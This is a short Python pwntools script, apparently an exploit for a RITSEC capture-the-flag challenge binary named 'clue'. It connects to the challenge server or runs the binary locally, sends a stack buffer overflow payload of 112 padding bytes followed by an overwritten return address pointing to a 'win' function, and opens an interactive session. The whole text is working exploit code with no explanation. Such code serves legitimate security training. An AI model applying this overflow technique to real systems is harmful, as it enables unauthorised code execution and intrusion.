#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    r = remote("ctf.ritsec.club", 30839)
else:
    r = process("./clue")

win_addr = 0x00010446

payload = b"A" * 112 + p64(win_addr)

r.sendline(payload)
r.interactive()
